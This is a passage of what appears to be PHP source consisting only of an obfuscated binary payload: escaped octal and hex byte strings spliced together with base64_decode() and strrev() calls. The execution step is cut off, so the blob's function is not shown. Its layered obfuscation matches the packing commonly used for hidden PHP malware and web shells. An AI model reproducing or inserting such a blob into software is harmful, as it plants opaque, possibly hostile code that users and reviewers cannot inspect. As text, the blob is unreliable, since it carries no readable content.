HnvnwzF16z7Ezd9935NqDj1l+QvM=')."\135\177\74\267\151\303\103\23\147\376\275\145\203\147\361\105\3\346\317\352\177\374\322\136\237\135\176\311\347\107\325\77\322\362\320\345\225\377\334\355\206\324\326\207\166\277\364".base64_decode('1U+PNh886InpMzcdtu+Vx1360VG77bHm8902HvLYJcddudjzwWmnPL5x6UuPbsk=')."\135\141\336\164\100\345\242\17\66\364\37\165\371\307\167\355\165\313\366\221\332\7\177\160\357\225\353\37\373\341\344\203\16\371\375\225\303\357\124\174\377\231\163\356\135\326\62"."\xd3\xbe\xfd\xee\x63\xee\x4d\x2d\xf6\xed\xfe\xf5\x86\x4d\xbf\x7e\x4e\xbd\xeb\xb5\xcb\xcf\x7d\xe5\xdf\x57\xcc\x7d\x61\xd3\xd1\x55\xfa\x29\x3f\xed\x69\x39\xe4\x90\xf7\x27\xcc\x53\xab\xce\x3c".strrev('†Şr~mµêÏ±^j®s4¼×êóŠ{ÂGÆód¼¾_†à±öºş³+Ÿg0İÍğ')."\367\336\337\363\173\13\217\337\347\361\365\75\231\103\132\157\267\36\270\370\354\131\366\272\237\253\277\74\330\367\351\321\23\216\55\126\132\317\54\257\337\343\244\326\215\373\314".base64_decode('rHuv41+TT3ltz73Df3rm2Lt3f7LjL396ZIv2r99+cXH0zQ+Hgr9aqSysfvbz5RM=')."\x6f\x78\xf9\xb0\xc4\xd\xf6\xdc\xc6\xe4\xc1\x7\x8f\x8d\x3d\xe9\x59\xb6\xeb\xe7\xc3\x87\x9d\x3b\x65\xf3\xd4\x4a\xfb\x91\xef\xcf\xbc\xaa\xf9\x83\x67\x5f\x52\x1e\x7c\xf4\xd5\xdd\xb6\xfe\xf7"."\xb3\xff\x3c\xe4\x80\x5\xeb\xab\x7e\x34\x79\xfa\xb9\x51\xed\xd2\x27\x2e\x4b\xf7\xa4\xdf\xff\x30\x7a\xdf\xc9\xaf\xae\xbc\xfe\xad\xfc\x1f\xba\xcf\x9d\xfc\xdc\x31\x4d\xef\x4c\xdb\x7a\xcb\x47".base64_decode('s4NP3l99/edbHzm+O/X4jatWf/Lowqd2fyle630189QDv3v1wtyen2Uv65zT9Is=')."\363\177\261\344\264\245\157\36\134\173\302\364\233\217\175\371\340\173\242\277\170\161\336\213\177\153\173\156\356\115\371\376\253\172\357\236\225\310\37\122\370\252\326\277\373\125\27".base64_decode('p0fPq7vp+/u+fsUth5187eTG3OjsXMtJTb4Xxn5/3to9fjPw53vO/N05jy1URyY=').strrev('åôœW	˜áı–S³Û¦åx/Ëó¼˜­Ÿİôş¢xÊ¿Õš®ï×´Şï—íÒ¿W')."\33\207\237\167\370\376\347\137\71\141\164\170\217\247\76\373\340\354\327\167\37\134\265\374\342\374\246\101\345\173\137\25\46\234\376\354\67\307\375\344\376\207\273\257\34\334\166"."\352\315\346\335\53\376\372\154\155\166\362\233\373\175\364\140\372\326\103\66\25\56\237\362\172\326\76\340\260\323\237\172\63\131\134\365\364\137\76\171\160\371\212\226\351\237\157"."\334\343\210\251\257\167\316\260\236\71\341\261\367\277\356\15\316\335\62\370\300\315\77\252\170\341\364\346\212\376\373\136\353\327\257\132\175\333\33\67\15\236\271\367\236\177\171"."\240\356\222\127\16\336\332\160\166\361\266\7\273\352\347\335\72\363\247\233\16\175\44\166\335\206\73\166\177\141\367\243\236\230\363\156\156\325\237\267\136\225\230\161\310\101\147"."\356\267\370\242\177\174\164\345\265\311\253\17\72\373\305\364\165\353\233\57\133\371\343\127\336\72\354\253\201\117\206\57\271\377\220\253\357\376\355\127\347\264\14\277\160\372\202".base64_decode('w80Dbp19xm1nHuT1fHLF5X37jB3w6lVbNz889GbNJ7ecdc9vz7p+7gFD76w/578=')."\36\373\254\343\372\223\317\367\235\362\365\7\357\104\266\335\77\372\351\175\267\274\26\361\177\363\361\77\267\276\347\337\162\362\266\123\376\361\267\117\227\275\347\377\146\344\77"."\x2f\x9e\x77\xde\xf3\xdf\x8c\x7e\xf1\xf1\x2b\x63\xc7\x9f\x32\xa7\xb2\xf2\xa3\xf\xf\x7d\xfb\xf3\x33\xae\xf9\x5b\xfa\x8b\xbe\xd0\x36\x7d\xd7\x5\x37\x84\xc3\x81\xd0\x5e\x23\xaf\x9e\x75\xe9".base64_decode('7sPLD9z9JwedemL20/SpJx6z5Y6XDr3jhJ0ts/6271G/qfm7p/nKePKbZ6967oE=')."\153\167\237\374\331\321\341\117\37\115\316\154\357\72\151\322\131\311\107\103\47\306\133\257\233\170\311\326\355\73\133\47\34\170\331\237\16\277\365\243\313\137\335\271\144\307\237"."\317\272\376\311\305\103\107\336\223\274\320\272\155\255\372\351\256\307\376\360\316\177\116\276\255\253\172\345\16\375\201\365\231\207\337\355\337\363\350\365\307\316\174\375\213\233\357".base64_decode('fWzBwKWx83+SuLBb+fjhkYeuXuR7qfmgZ/dN1R29Ir/8yCtfuXzNnkvsMx/e98w=')."\xaf\xf7\xea\x3a\x7a\xd9\xf\x7d\xc7\xcc\x38\x74\xc5\xd2\x1b\xde\x5a\xfb\xf5\xa6\xc1\x3d\x9f\xff\xcd\x99\x37\x3c\x7b\x46\xed\x71\x9f\xcf\x3c\xc8\xb6\x37\x6a\x2f\xcf\x5f\xf2\xdc\xa1\x83\x95"."\133\363\157\336\76\167\327\340\324\71\237\175\262\347\76\307\357\375\327\347\76\271\314\373\312\355\231\344\326\307\132\236\333\324\271\371\305\135\325\227\157\331\376\300\5\13\257"."\x39\x6a\xfb\x29\x37\x7d\x79\xc7\xd\xff\x38\x62\x5a\x61\x74\xf0\xf\x7\xbe\x31\xf6\xd9\xf4\x6d\x7f\xfe\xd3\xdc\x37\xab\x66\x7f\x99\xb9\xfb\xb5\xcc\xc6\x37\xef\x39\xf6\xa6\xeb\x7e\x71\x6c"."\303\257\267\375\164\240\345\222\367\157\274\73\366\241\176\362\75\113\3\65\323\126\76\377\353\65\133\373\347\376\350\274\301\67\376\275\371\331\67\27\237\167\300\157\117\152\73"."\x7c\xcd\x49\x67\xdd\xbe\xa2\xfe\xf8\xdf\xb5\x9f\xf5\xe1\x21\xcb\x5a\x3e\xdb\x77\x6c\xaf\xfe\xd\x55\xfd\x7b\x4c\x53\xcf\xd8\x75\x49\x97\x67\xec\x8e\xaf\xf6\xbc\x6e\xd2\xd3\xbf\x5c\xf5\xfd"."\265\147\374\361\352\213\177\265\307\153\373\126\116\170\373\210\142\54\173\344\374\357\77\166\344\13\265\237\234\156\237\327\161\313\77\142\13\177\77\351\264\364\7\77\77\372\136"."\xcf\x65\x55\x95\x1f\xec\x17\x38\x68\xb7\x43\x6b\xfb\xef\xbc\x70\x73\x71\xf2\x5e\x17\x9d\xb6\x6f\xbc\xa1\x75\xe6\xab\xe7\x6c\xba\xf9\xfa\xb\xdf\x7e\x5b\xbd\xa5\x72\xe1\xfe\xb3\x4f\xd9\x70"."\xe1\x3b\x5f\x4c\xdc\x62\xfd\x6e\xaf\x93\xab\xf\xbd\xe3\x7\x99\x48\xee\xbe\xc3\x7f\xf7\xa7\x55\x77\xed\xa8\xb\xa8\xbf\x78\xfa\xea\x83\xcf\x56\x2e\xd8\xd9\xf0\x83\xf9\xcd\x8f\x27\x9f\x37"."\46\77\363\227\311\63\172\322\117\327\214\106\146\117\76\177\113\376\236\352\37\240\272\377\166\362\136\137\214\276\335\171\321\207\177\177\176\345\354\313\332\16\335\74\372\343\375"."\x36\x9c\x52\x77\xcc\x8e\xba\x1f\x54\xb4\xc6\x76\xed\xd1\xbd\xbe\xf7\xe1\xf\xfb\x5e\xef\x7f\xa1\xed\xf4\x86\xd3\xaf\xbf\x6e\xe5\x23\x37\xce\x3d\x6c\xd3\x35\xe7\x9f\x76\xe7\xc3\x2b\xa7\x9f"."\266\345\311\277\56\333\333\363\323\337\376\366\251\272\315\77\173\121\271\244\267\342\251\67\156\376\111\335\254\177\336\263\341\316\217\242\323\356\133\166\315\274\77\76\165\325\75".base64_decode('+i71kF/9965dg98Enuvac2TNu8PG7S//8LrQof2v9Oa262dc/tuT/nTjQ+pbQ0M=')."\xb7\xbe\x7f\xf9\x7a\xe3\xcc\xb1\xb5\xea\xd0\xb6\xe8\xd4\xbc\xcf\xd7\x70\x8a\xe7\xe6\x37\x8e\x3d\x7f\xdd\xf1\x37\x1d\xbe\xaa\x6b\xda\xb3\x67\x9c\xfb\xc1\xd4\xa3\xcf\x7d\xeb\xce\x89\x27\x6e".base64_decode('PvXKPyz8T27X8yt93/vLEaGh7b+6dutNh2Se7qw47d7guy8+d8utFUd9b9cRBz8=')."\xdf\x59\xbc\xfa\xf3\x73\x5a\xd7\x34\xdd\x76\xf1\x9a\xdc\x94\xce\xff\xca\x2e\xf1\x2c\xbd\xe9\xa4\xc9\x8f\xde\xd8\xd5\xae\xcd\x5b\x11\xf4\x5d\xf3\xcd\xbb\xef\xbc\xbe\xec\xc8\x6d\x5f\xbd\xf3"."\267\247\23\127\235\372\357\147\277\70\365\324\65\377\171\352\227\77\273\146\336\326\317\337\335\366\360\232\135\257\177\161\267\377\67\123\116\371\364\237\137\214\155\333\166\340\251"."\xdb\xbe\xfe\x64\xec\x96\x9f\xfd\xec\x9a\x75\xf6\x7f\xae\x7c\xfb\x9a\x53\xbf\xdc\x35\x36\xeb\xd4\x6d\x5f\x3e\xff\xde\x37\x5f\x7d\x79\xc0\xc9\xaf\x5\xe7\x9c\x7a\xcd\xa7\xd3\x7e\xb4\xef\x33"."\107\377\175\373\332\37\156\174\246\253\353\276\267\376\152\375\343\101\377\332\207\173\266\304\373\347\156\375\364\241\257\237\170\124\275\373\225\217\354\65\213\236\254\374\327\361\363"."\xf6\x7a\x40\x6d\xbc\x65\xc1\x1d\x91\x73\x7e\x37\x70\xe7\xac\x8a\xf9\x7\x3e\x71\xc9\xfb\x1f\x78\xee\xbb\xeb\xa\xff\xad\xb7\x19\xd9\x9\xd3\xba\x16\x4c\xd8\xb8\x61\xeb\x61\xa1\xcb\x4e\x3d".base64_decode('+5DRPZ7/+Iya41ZPOGDCs0t2TZr+Yu7oY/bZ+/KnNu/95/sbr6w59pvjX9Cf/1k=')."\xf2\x70\x76\x25\x60\xe6\x8c\x99\x34\x0\x56\x30\xc3\x3\xd9\xdc\x50\x6\xa4\x81\xda\x5a\x38\x70\x4\x7d\x68\x71\x70\x54\x1b\x1a\x58\xd\x5c\x99\x99\x49\x8d\x32\x15\xe0\x74\x90\xd7\x46\x7b"."\125\235\51\3\153\353\240\316\221\321\76\65\157\100\261\31\165\120\331\314\331\300\135\15\46\373\262\305\41\140\320\346\314\2\113\251\151\120\345\254\351\320\100\60\217\51\16"."\331\275\51\23\216\207\172\63\206\331\277\32\116\364\352\40\307\314\351\263\150\240\177\120\37\65\230\341\240\231\137\75\70\232\3\61\276\320\147\16\132\214\337\65\6\206\262".base64_decode('uRHINqsWmjdrFtQycyYEps0B/riQH+gfAu1Y7TTo5LRpUFCzVg8P9cO4zJgOhWY=')."\xcd\x84\xd6\xf5\xad\x1e\x4d\xd\xe4\x73\xec\x23\x30\x6\xe9\x42\x5f\x66\x74\xf5\x0\xfb\x22\x14\xca\x26\xd5\xcc\xc8\x0\x1c\xed\xaa\x23\xc5\x82\x96\x65\xc6\x72\xb9\x4c\x61\x28\x39\xa\x72"."\216\231\112\352\171\210\214\150\3\251\241\102\216\61\263\205\234\131\204\361\111\216\132\331\241\176\30\201\131\63\140\152\363\126\146\165\212\151\24\323\5\55\145\26\101\153\230"."\66\107\162\275\375\360\301\221\336\254\221\143\142\130\256\60\334\77\300\130\352\332\72\66\334\172\161\150\330\206\311\267\263\275\175\311\101\220\22\352\130\67\247\315\201\300\354"."\331\323\331\260\301\364\316\254\201\201\114\25\263\303\275\103\320\201\241\176\133\67\231\270\226\121\321\64\245\0\217\364\276\336\221\24\323\33\17\251\203\43\253\207\101\332\237"."\63\35\152\232\315\121\255\246\216\65\4\332\252\351\271\102\72\13\26\212\265\263\141\54\330\134\316\232\15\223\245\16\366\26\262\31\230\200\351\14\21\146\326\314\142\325\1"."\262\326\315\144\375\142\70\257\365\347\173\107\155\20\207\146\263\276\365\15\32\151\165\30\206\150\166\55\114\363\220\331\267\72\71\14\263\64\155\46\133\163\65\60\62\203\351"."\x6c\x2e\x59\xe4\x2a\x4e\xa3\x98\xeb\x1d\x62\x42\x68\xc1\xb4\xd3\x30\xa3\xd9\x54\x7a\x28\x39\x8\xd9\xea\x66\x4c\x67\xb8\x4\xd5\xcd\x60\x23\x3e\x98\x33\x52\x56\x96\xd9\x3a\xf4\xf\x9b\x5"."\246\267\231\61\175\72\133\111\314\320\100\357\65\212\331\41\66\125\320\355\276\154\136\135\255\133\60\332\354\113\323\31\36\14\233\3\132\321\30\145\120\110\56\30\305\325\251"."\x34\x4c\x6b\x2d\x1b\x2f\x3b\x33\x3c\xd0\xcf\xe\x7b\xeb\xa6\xc3\x70\xce\x9e\xe\xe3\x3f\xab\xe\x20\x19\x33\x85\x8\xb\x4c\x7d\xdd\x1c\xa8\xb3\xf\xc9\xde\xa3\x29\x93\x75\xb9\x96\x21\x50"."\x32\xaf\xb1\x43\x76\x5b\xcd\x66\xfa\xf3\x4c\xad\xa0\xda\xa6\xc5\x70\x66\x3a\xc3\x8e\x11\xcd\x1a\xea\x67\x32\xef\x9c\x3a\x68\xd9\x50\xe\x7d\x2f\x9\x2b\x72\x45\xe\xa\x35\xaa\xa9\x7e\xa6"."\237\104\62\247\135\264\134\31\370\145\216\274\57\247\346\271\41\107\53\314\156\112\266\37\226\63\364\153\32\263\133\145\113\134\130\12\130\105\142\121\17\160\44\361\13\105\153".base64_decode('OilEWqwhkOwLcDQml0zlbSkZxRypMdswuUUDtZXy4Vb5nP2sgVEuc5gGikvLGjI=').base64_decode('TBiOfiOdyhrFtKPWdNJRJ4cySd6d0jsOHNXjMAdlMMcAJcmMJeSIjw1xUppNqvE=')."\265\125\253\337\47\203\275\162\252\236\107\255\310\146\175\316\373\147\11\362\7\306\200\336\161\262\264\201\242\226\27\347\253\126\277\64\360\370\342\130\147\107\42\36\210\55\226".base64_decode('DMrwxSaGQglhGSx1S9QgjaM8g84hYEcdO2/fOnbRxh2X3bHjgi1jD1yyc8sdYw8=')."\x5d\x86\xa2\xdb\xef\xbf\x70\x6c\xcb\xd5\xef\x5f\x7e\xd6\xf6\xfb\x2f\xd8\x7e\xff\xfa\x9d\xe7\xfc\xea\x1f\xf\x9e\x3f\x76\xd1\xed\x3b\xcf\x78\x68\x6c\xf3\x8d\x63\xff\x75\xce\xf6\xad\xf\xed"."\334\166\316\173\67\236\267\375\376\333\166\154\76\167\354\254\173\267\157\335\70\366\343\153\307\316\271\150\307\45\27\154\177\150\63\312\277\343\307\242\146\224\155\354\266\115\270"."\354\203\247\217\335\177\377\316\353\156\344\251\377\170\360\64\332\230\121\40\65\213\64\33\337\7\143\126\102\144\164\224\371\12\40\244\146\371\224\216\254\206\106\130\111\145\264"."\124\77\66\51\262\63\232\251\330\304\264\110\105\177\363\106\336\113\21\216\336\265\263\24\75\217\223\25\66\67\76\216\224\161\55\127\300\250\5\243\344\247\327\157\34\66\306"."\x12\xfe\x95\x1b\x66\x9a\x50\x6\xad\xf0\x58\x8b\xb9\xaa\xc2\x41\x38\x30\xc2\xa\x31\x5\x31\x43\x59\x7c\x2b\xa3\x17\x15\x53\x98\x55\xbe\x62\x1b\x2c\x9c\x1b\xe1\x93\xee\x5a\x4\x65\xa7\x95".strrev('*z…)´(÷9%'."\0".'‘ÎIÈ˜“›Ö8$“•VE(%ç§-²L4(•B×mMƒ7')."\xce\x3b\x64\xf8\x54\x9b\x31\x87\xf2\x1a\x93\x9b\x6f\x6a\x85\xac\x9a\xe2\x4d\x2f\x8c\x94\x1d\x44\xb9\x35\xf2\x89\xab\xab\x6b\xb1\x32\xc3\xc8\x3b\xe7\x48\x44\xeb\xba\x68\x97\xc9\x28\x8f\xb6"."\xe3\x4\xd2\x68\xca\x22\x42\x27\xce\xdd\xc8\xb9\xb4\xe8\x6\x8d\xa\xdd\x2c\xfa\x10\xa7\x93\xa6\x96\x66\x9b\x67\x4e\xcb\x91\x9c\xcc\xbc\x9c\x68\x84\xb9\xd\x6e\xa\x2d\x1\xd3\x71\xb0\x33"."\x6f\x41\x21\x53\xc0\x57\x77\xed\xb9\xb\xe0\x8a\x20\x1c\x58\x25\xa4\xef\x42\x58\x5c\x85\x90\xa1\x59\xf7\x61\x11\x5f\x30\xcd\x8d\xd2\x5\x5a\x9c\xad\xde\xeb\xf5\x4a\x8a\xd5\x2c\x3f\x4f\xc1".strrev('»ˆ°J2ABÍğÌAd‹WÛ:‚ªe ½Éë²Í>¾ó-'."\0".'JÜÍàñæ¯X"rœN¨!')."\363\122\243\150\160\156\321\142\306\374\305\174\226\101\121\20\145\211\26\363\170\336\352\235\75\321\362\151\251\320\134\65\145\67\110\275\351\205\241\362\211\136\252\123\105\272\226"."\76\1\206\133\352\373\20\144\140\145\333\234\263\211\172\345\345\23\214\46\15\155\374\151\213\30\104\302\76\2\125\132\322\305\305\250\300\15\134\234\14\302\267\24\265\345\211"."\x2c\x20\xe6\x22\xcf\x2d\x21\xad\xac\xca\xe\xd9\x2c\xc4\x71\xe8\x79\x8d\x63\x55\xd1\xe2\xda\xff\xc6\x40\x2c\xd4\x94\xe8\x8\x30\x1b\x7f\xb5\x50\xf0\x5b\xe9\x7e\xcb\x8f\xd\xf2\xf4\x41\x2d"."\254\47\375\370\106\43\106\22\137\222\31\103\340\245\41\226\166\102\355\205\333\143\41\110\307\266\310\11\264\357\133\322\342\117\364\151\166\2\330\37\350\41\241\355\11\65\151"."\x98\xb6\xb4\x2\x12\x69\x1d\x1a\x17\xe\x35\x26\x9a\x43\x51\xa9\x8e\x42\xb1\xa4\xe\xe9\xea\x7a\xa0\x23\x94\x88\xc5\x22\x52\x77\xc8\xbd\xaf\xe5\x89\xc5\x91\xe6\x44\x53\x24\xb2\x38\x4\xc8"."\xd\x13\x5f\x2f\xd1\x5f\x7c\xcb\x48\x1c\x3\xe3\x98\xb8\x6d\x84\xcf\x41\x64\xa3\x2b\x99\xc1\xc1\x77\x8b\xf1\x26\x1e\x53\xc0\x24\x11\xad\xa2\xa6\xd6\x40\x94\x5b\x7e\xcf\xf0\xd5\xf8\x6a\x45"."\136\364\301\4\66\200\157\140\127\33\143\361\100\264\314\15\163\172\363\34\220\2\156\233\103\201\326\310\62\245\51\22\356\154\153\217\321\213\325\24\336\36\221\322\211\175\57"."\x24\xb3\xfb\xe7\xa5\xc9\x50\x7d\xb0\x23\x1c\x68\xa\x2a\xa1\xf6\x78\x84\x19\xf0\x73\x8b\x4b\x72\x75\x23\xc6\xe3\x6c\x8\x4c\x4b\xe3\xf7\xcb\xa1\x3c\x8d\xc8\xd7\x4b\xe4\x1a\x79\x4d\xb0\x8c"."\xba\x3c\x95\xdd\x15\xdd\x53\xba\xab\xba\xab\x57\xf9\xba\xad\x1e\xbf\xb4\x23\xea\xf2\xf4\x40\xa4\xa3\x19\xba\x57\xcf\x43\x69\xb\xd0\xad\x2d\x16\x5b\x2\xf7\x91\x22\xd1\x40\x53\x98\x35\x5".base64_decode('ITcEI00hGnjv0ju3P3Dhe1duGTv3AlTRjitO3/GzexEDhJmeLee/9/CFOy69fcc=')."\xf9\xc0\xac\x28\x3b\x6f\xbf\x6f\xfb\x43\xdb\xde\xbb\xf4\xc6\xb1\x2d\x9b\x76\x6c\xfc\xf5\x7b\x57\x9c\x49\x13\xde\xbf\xe9\xce\xb1\xd\x37\xf2\x86\x29\xef\x5f\xf2\xf0\x8e\xb\xaf\xe7\x8c\x10"."\345\177\74\250\364\373\147\135\360\336\103\133\60\33\364\213\365\73\356\71\157\307\346\13\306\66\134\67\166\371\215\357\135\170\373\330\317\317\30\73\373\202\235\267\137\166\202".base64_decode('G5FovItNBZgF+E/utqZU0eHttqbioa1Gv1X4PgD6ZWbNxPJ1SWewvSnovl8jR+E=')."\162\376\24\212\41\324\320\3\170\126\13\56\367\263\170\202\334\233\252\34\267\25\153\141\376\245\106\111\215\151\16\306\232\242\241\306\40\130\234\363\211\232\104\270\66\260\56"."\x40\xd0\x58\x74\x29\xf\xf3\x2b\x65\x25\xce\x14\x94\x2a\x86\xcc\xd5\x8a\xa3\x23\xaa\x2f\x65\x64\x8b\xb9\x3c\x69\xac\x52\x81\xd\x96\x2a\x3c\x98\x68\x91\xcb\x3e\x4a\x5\xde\x99\x11\x40\x4b"."\241\245\127\205\57\134\23\213\326\312\25\225\236\32\117\155\265\2\236\26\150\11\360\257\240\124\200\341\63\57\347\370\210\47\351\210\325\172\152\252\225\212\102\177\5\264\113"."\214\53\152\175\202\346\264\24\325\123\5\15\226\233\53\362\42\152\146\331\246\252\43\362\246\244\74\34\304\313\243\137\207\317\204\224\117\224\240\363\204\162\270\141\112\240\275".strrev('EÃ½'."\n".'úF¦ùñ:\'@©ªŒàÑƒÅ$I—ñØ$•«+šy_)†F$¨èZº“™Ù').strrev('i,åFÄi2ÄŸ8bØÄr!5çg6'."\n".'xššê¼±léC'."\n".'¦J'."\0".'¢lZ¥›')."\77\163\126\37\43\165\340\173\241\155\5\357\3\303\145\205\261\70\334\203\6\276\215\26\214\67\265\122\54\217\111\150\236\116\116\162\40\252\30\116\305\201\42\134\74\201\174"."\164\271\140\202\260\37\311\27\152\157\211\104\333\350\55\254\130\123\153\260\55\340\3\42\116\61\201\346\307\374\233\322\240\124\142\312\107\101\225\216\341\47\37\142\103\26\47"."\137\105\353\52\141\43\146\214\216\102\241\17\32\3\263\257\220\233\270\52\51\322\120\111\57\275\103\225\334\325\113\44\32\117\240\1\0\362\54\121\335\112\151\267\220\314\236"."\xf1\x65\xa2\x41\x26\x57\xf4\x22\x3e\xcc\x60\xf7\xf7\xd3\x49\xe6\x11\x6\x55\x8e\xeb\x6c\x8a\xb4\xb7\x84\xd8\x85\xb3\x66\x90\xda\xb\x69\xc3\x91\xa9\x39\x1a\xc2\xb7\xaa\xe1\xfb\xa\xab\x4a"."\272\346\207\42\302\226\1\105\12\114\333\214\302\342\172\61\116\340\173\76\212\210\55\37\105\370\146\203\163\111\256\153\360\367\143\355\74\54\30\150\24\301\166\165\202\372\56"."\153\346\341\126\176\133\24\47\104\242\122\44\20\15\264\305\170\64\272\214\337\143\340\60\172\237\41\321\336\331\46\50\176\70\260\24\41\113\104\60\50\214\132\127\371\246\54".base64_decode('qO6md8JokP4sZDF8T6ZnTa1HmbmuGvKwW1QJO6PnGa+Lv7IknAhHFtE4cakTzKc=')."\205\214\243\164\51\210\361\216\13\306\333\142\133\27\137\15\12\302\141\205\136\64\125\332\43\313\2\302\113\213\224\0\20\341\264\305\177\162\127\367\120\267\17\61\13\326\52"."\x71\xc7\xab\xb9\x51\x61\x6c\x48\x13\xd1\x11\x50\x55\x2\x94\xe\xb0\x6d\x74\x95\x7\x76\x8c\x44\xd6\xe8\x63\xe\x1b\x10\x41\x64\xec\x2\xfd\x5d\xce\x2\x84\x56\x42\x1\x24\x38\x17\xb2\xec"."\xb2\x17\xbd\x65\x96\xe8\x5e\xdb\x3d\xb9\xdb\xeb\xa3\x17\xeb\x30\xf3\xd2\xed\x11\x4d\x4a\x4\x97\xa3\x3d\x36\x16\x73\xdc\xa\x4c\x10\xbf\x23\x50\x3b\xea\x25\x84\xe8\xaa\xa5\x91\x79\xf0\x3"."\22\335\74\140\117\41\72\277\201\117\146\160\311\332\166\364\167\121\174\155\20\375\15\243\237\160\34\115\227\316\63\240\45\31\16\55\16\256\305\377\210\204\152\76\220\364\72"."\215\263\100\250\175\55\372\27\21\230\265\241\166\167\145\215\301\370\262\140\220\146\140\141\370\25\131\21\301\201\256\112\56\227\260\1\74\44\13\203\170\250\72\221\250\42\203".strrev('Ş)Î‘¢‹âHîDî®bÅ(„¾ “X!ì%mbrª¾ï~ÀN­øHZ™íé').base64_decode('Glgaal/EYv4pLDQFqlaaQzE0RE0MGYV/IzkODCdhi2Su14HSzYiyo4jEsmNhgFI=')."\x66\xe7\x2a\x6b\xec\xc\x85\x9b\xe5\x8b\xd0\x38\x23\x6c\x28\x84\xaa\xc3\x9e\x32\x89\x35\x8e\xc5\xc9\x95\x68\x16\xc1\x43\xce\xc2\x4\xdd\x58\x84\x8c\x1\x8b\xd0\x1\x60\x31\x32\x5c\x2c\x42"."\374\50\261\10\351\50\213\140\351\44\330\316\322\220\214\212\344\113\46\170\146\324\101\176\223\157\156\72\51\335\272\307\64\330\107\265\157\330\65\3\222\342\124\256\43\165\51"."\x58\x89\xae\x4b\x52\x27\x50\xbb\x37\x45\xba\x50\xec\xa7\x20\xc4\x6d\x12\x20\xfa\xed\x5e\xb5\x80\x70\xc3\xab\x18\x62\xd2\x5b\xab\x76\x5c\xb7\xb3\x8e\xaf\xc0\xed\x36\xf4\x95\x10\xb9\x52\x28"."\x7d\x87\xdd\x15\x20\x9a\xc5\x84\x21\x69\xb7\xc9\x46\x2d\x3\x84\x2e\x8b\xaa\xc2\x41\x6d\x2c\x54\x42\xd8\xde\x8f\x28\x94\x69\xd4\x29\x42\x71\xba\xb4\x8a\x4b\x46\xe0\x9\xc0\x3\xbf\xd0\xa2".base64_decode('A+lPN0SZKgSugVR6YJNldwac0nF3d8V4owUZ2JhBtIJGWSmd73mpDPbekLBzTJU=').base64_decode('ToQzobSmim8Rb45GOigHooRaFOobQKmkqvJKYK2aokG8OmgullZV6VByza9U4KI=').base64_decode('cLWzVKi9ObhcqdTTwwlVTUBhBa1FVpFSUhOrgbZ1GkQyxpAioxeTl5soLC5QroQ=')."\65\43\267\374\331\245\114\17\10\345\74\205\162\304\64\51\24\103\33\166\70\114\172\212\222\164\13\63\262\36\205\137\306\307\100\54\174\120\345\51\124\304\22\150\105\64\51"."\270\74\36\15\140\40\341\76\367\337\17\375\41\4\5\113\107\146\216\170\212\110\120\236\315\267\12\224\4\253\34\54\42\145\36\61\223\10\30\104\266\74\251\117\74\205\150"."\xa\xe8\x30\xcb\x7a\x84\xc5\xc0\x75\xd3\x58\x47\x34\xd4\x16\x88\xae\x80\x21\x13\x32\x0\xac\x40\x23\xeb\xb8\xaf\x2a\x22\xba\xd5\x29\xdd\x98\x6e\x47\xad\x96\x6f\x50\xd3\x39\xe6\x14\x16\xc9"."\xb3\x8c\xc2\xa2\xd6\xc0\x2\xc0\x33\xf\xc\xf\x75\x7b\x97\xe0\x17\x62\x99\x12\xa5\x8a\xdd\x33\xf5\xb0\x0\x73\x4c\x40\x6e\xf6\x30\x4d\x59\xe\x91\x1c\x1e\x13\xb3\x6\xb8\xf\xb3\x22\xa7"."\xca\x57\x94\x84\x5f\x3e\xbc\x49\xe2\x49\x66\xd4\xbe\x25\xd0\x19\x96\x21\x30\x54\xca\xe2\xe0\x8a\x6f\x59\x23\xac\xa5\xe5\xd6\x8\x4b\x63\xea\x18\xbe\xda\xa0\x3f\x55\x33\xa0\x7f\xd4\x57\x42"."\x55\x1d\x92\x49\x8b\x79\x4b\xef\xcb\x73\x27\x60\xd0\x2a\xd8\x5b\x3b\xe3\x91\x4\xda\x3f\xa2\x41\x4c\xcd\xa1\x47\x7c\x58\xa5\xf6\x4a\x72\xb7\x3c\x29\x50\xd\xce\xc0\x9d\x1c\x7e\x4b\xd7\x58".strrev('²’ûPBÏ«!8#’(OPÙ°{°Öè8k'."\n".'mÅ	hlÔ(¾Ø)æ¹åã]r')."\xa3\x8c\x84\xf0\xb7\xe1\x53\x85\xd\xb4\x6d\x16\x25\xd7\x73\xc4\x1e\x1a\xcd\x7f\x40\x5c\xab\xe7\xda\x6c\x92\x56\x4c\xe2\xcc\xd2\xae\xa1\x1b\xf5\xf8\xa8\x2\x43\x29\xf7\x31\x97\x61\x4b\x81"."\x5d\xb8\x6\x97\x7c\x6e\x63\x65\x19\x2c\xec\x9d\xf9\xd9\xa\x33\xb3\x46\xe4\x2a\xe7\x28\xd0\x29\xdd\x7f\x57\xd3\x92\x71\xb3\xc2\xbe\x4c\xe\x7d\xf2\x4e\xf7\x71\x68\x43\xcc\x26\xb0\x2b\xa"."\44\357\45\64\321\376\234\146\131\374\350\227\110\67\54\150\147\204\37\0\331\75\136\163\43\33\253\142\336\216\151\314\222\242\71\111\54\305\305\215\54\76\160\226\144\101\116"."\316\121\304\170\123\317\205\256\202\120\123\210\167\134\312\45\200\141\341\17\17\37\141\210\72\173\230\214\56\72\71\252\27\334\147\26\171\243\103\63\163\72\71\233\131\46\256"."\247\360\164\251\64\271\357\143\174\333\340\26\363\350\13\35\174\146\275\314\32\201\173\74\45\10\243\160\1\225\337\271\100\123\112\312\112\106\371\204\111\202\152\115\70\45\75".strrev('ÌvØÆ^_'."\n".'¦Íˆ±ôÄ dXÒ'."\0".'|Æsáíe‘Í¦€kªXÜHüÔÚ0Û8ÕÁ')."\115\110\216\142\117\220\161\200\114\246\300\311\100\264\251\25\211\340\211\226\20\332\103\320\6\45\52\150\105\105\221\164\57\115\223\4\155\143\336\163\20\377\210\67\321\260\321"."\307\27\57\142\321\300\107\224\143\1\207\42\120\326\247\341\353\65\364\212\3\276\2\305\13\122\377\110\337\135\250\123\162\237\70\316\332\54\133\256\11\62\362\17\232\104\237".base64_decode('8t0fjGpiW0TFyG2m7ywkPHiSL5FCEt1ylSEIRO9iwFxnIFm4u0HEsj2SaEX0OMI=')."\x76\x6d\xdd\x8a\x3b\xe8\x1f\x2b\x5\xab\xd5\x46\x4c\x45\xca\x4f\x6e\x75\x82\x4c\x34\x97\x1c\xdc\xd0\xa3\x41\x90\xb3\xd6\x20\x12\xc8\x43\xcc\x18\x2\x9c\x31\x89\xdd\x32\x40\x7f\x56\xe4\xd2"."\136\324\160\60\255\110\153\66\167\202\203\127\131\100\162\321\43\335\211\315\161\2\65\44\171\245\123\7\65\174\171\211\151\34\112\154\122\240\53